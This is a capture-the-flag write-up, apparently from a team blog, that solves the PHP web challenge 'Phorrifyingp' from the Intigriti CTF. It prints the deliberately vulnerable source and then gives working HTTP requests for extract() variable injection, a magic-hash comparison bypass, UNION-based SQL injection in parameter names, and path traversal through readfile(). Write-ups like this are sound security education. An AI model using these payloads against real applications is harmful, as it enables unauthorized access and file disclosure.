---
layout: post
title: Intigriti CTF — Phorrifyingp
author: Cillian
tags: [ctf, web]
---

In this post I'll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.

<!-- read more -->

## Initial Assessment
The source code for the challenge can be seen below:

    <?php  
	    /*  
	    <flag> ➡➡➡ ⛳🏁 ⬅⬅⬅ <flag>  
	    */  
	    if ($_SERVER['REQUEST_METHOD'] == 'POST'){  
		    extract($_POST);  
	      
		    if (isset($_POST['password']) && md5($_POST['password']) == 'put hash here!'){  
			    $loggedin = true;  
		    }  
	      
		    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){  
		    header('Location: ' . $_SERVER['REQUEST_URI']);  
		    }  
		      
		    if (isset($loggedin) && $loggedin){  
			    echo 'One step closer 😎<br>';  
		      
			    if (isset($_GET['action']) && md5($_GET['action']) == $_GET['action']){  
				    echo 'Really? 😅<br>';  
				      
				    $db = new SQLite3('database.db');  
				    $sql_where = Array('1=0');  
				      
				    foreach ($_POST as $key => $data) {  
					    $sql_where[] = $db->escapeString($key) . "='" . $db->escapeString($data) . "'";  
				    }  
				      
				    $result = $db->querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));  
				      
				    if ($result == 'admin'){  
					    echo 'Last step 🤣<br>';  
				      
					    readfile(file_get_contents('php://input'));  
					}  
			    }  
		    }  
	    }  
    ?> 

We can see that this challenge will require us to bypass a number of conditional statements in order to execute the final readfile() function, where we will then need to modify our payload so that we can read a file.

## Step 1: We're Logged In!

    if (isset($loggedin) && $loggedin)

The first important conditional statement is checking if the $loggedin variable is true. We notice a suspicious usage of the extract() function above this. This function allows variables to be extracted from arrays. It's being run on $_POST which is our POST input (user/attacker controlled). This will allow us to not only declare variable, but also to assign values to them using POST data.

We can simply pass a loggedin parameter with a value of true.

> POST / HTTP/1.1 Host: phorrifyingp.ctf.intigriti.io Content-Type:
> application/x-www-form-urlencoded Content-Length: 32
> 
> loggedin=true

Once sent, we see the confirmation on the page:

> One step closer 😎

## Step 2: It's Magic!

    if (isset($_GET['action']) && md5($_GET['action']) == $_GET['action'])

The next conditional statement is checking for a GET parameter named "action". This parameter must satisfy the condition that its value is equal to its md5 value.
  
This seems very unlikely. In fact, it takes a little bit of understanding about php [magic hashes](https://www.whitehatsec.com/blog/magic-hashes/) to understand how this condition could be satisfied.

In short, the use of "=\=" allows for comparison of different object types. If we wanted to compare the literal value, we'd use "\=\=\=". If we enter a String with a value such as "0e1", this will effectively equal 0 to the power of 1 (which is 0). In fact, 0 to the power of any number will always result in 0.

Using this logic, we simply need an input beginning with 0e and followed by a series of numbers which results in a md5 hash which also begins with 0e and is followed by a series of numbers.

Once such input is "0e215962017". The md5 value of which is "0e291242476940776845150308577824".

Placing this as a GET parameter, we will get one step closer.

    POST /?action=0e215962017 HTTP/2
    Host: phorrifyingp.ctf.intigriti.io
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 13
    
    loggedin=true

We get the confirmation:

> Really? 😅

## Step 3: State Of The Union

    if ($result == 'admin')

The last conditional statement checks if $result is equal to 'admin'. This value comes from a SQL statement. Each of the parameters we pass in our POST data will become a part of this query. They are joined with the 'AND' condition. The clause array is initially populated with "1=0" which can never be true.

Firstly, we encounter errors about "no such column loggedin", which hints that we'll need to find a way to get rid of this part of the query, we can do so by commenting it out.

    1--=aaaa&loggedin=true

Next, we notice that the current state of the query will never be true due to the "1=0" condition. This hints towards us using a UNION query to separately select the "admin" entry. We inject this into the parameter name.

   

    POST /?action=0e215962017 HTTP/2
    Host: phorrifyingp.ctf.intigriti.io
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 52
    
    1/**/UNION/**/SELECT/**/"admin"--=aaaa&loggedin=true

We receive the confirmation that we have bypassed this check:

> Last step 🤣

## Step 4: Traversing The Plane
   

> Warning</b>: 
> readfile(1/\*\*/UNION/\*\*/SELECT/**/&quot;admin&quot;--=aaaa&amp;loggedin=true):
> failed to open stream: No such file or directory in
> /var/www/html/index.php

As we can see from the error above, the entire POST data payload is being sent into the readfile() function.

We can enter invalid directories, as long as we traverse back out of them. Using "\.\." we are in effect removing it from the path **before** it is ever searched for.

    POST /?action=0e215962017 HTTP/2
    Host: phorrifyingp.ctf.intigriti.io
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 108
    
    1/**/UNION/**/SELECT/**/"admin"--=a&loggedin=true&test=/../../../../../../../../../../var/www/html/index.php

And we get the flag:

> 1337UP{PHP_SCARES_ME_IT_HAUNTS_ME_WHEN_I_SLEEP_ALL_I_CAN_SEE_IS_PHP_PLEASE_SOMEONE_HELP_ME}

## Final Notes
Thanks to all members of "Team Ireland Without RE" with special thanks to [@0daystolive](https://twitter.com/0daystolive).
